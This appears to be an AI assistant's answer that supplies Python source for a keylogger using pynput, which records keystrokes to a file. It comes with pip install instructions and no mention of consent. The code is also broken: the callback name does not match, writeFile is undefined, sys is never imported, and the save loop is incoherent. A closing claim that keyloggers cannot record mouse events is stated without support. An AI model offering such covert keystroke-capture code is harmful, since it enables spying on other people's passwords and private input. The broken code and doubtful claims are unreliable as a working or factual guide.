Here's an example of a basic keylogger using the pynput module in Python. This is a simple version which logs all input and saves it into "log.txt":

```Python
from pynput import keyboard

keys = []

def onPress(key):
    global keys
    keys.append(key)

with keyboard.Listener(on_press=OnKeyPressed) as listener:
    listener.join()

while True:
    try: 
        writeFile('log.txt',keys)
        sys.exit(0)
    except KeyboardInterrupt:
        break
```

This code doesn't provide many advanced features such as saving to a database, filtering out non-alphabetical characters, or formatting keys correctly. However, it should give you a good starting point for your implementation. 

You need Python and pynput module to run this, if you don't have them installed, you can install them using pip command:
pip install pynput

Note that keylogger in windows can only log the keys pressed with the keyboard. The mouse movements or other non-keyboard events are not logged by keyloggers.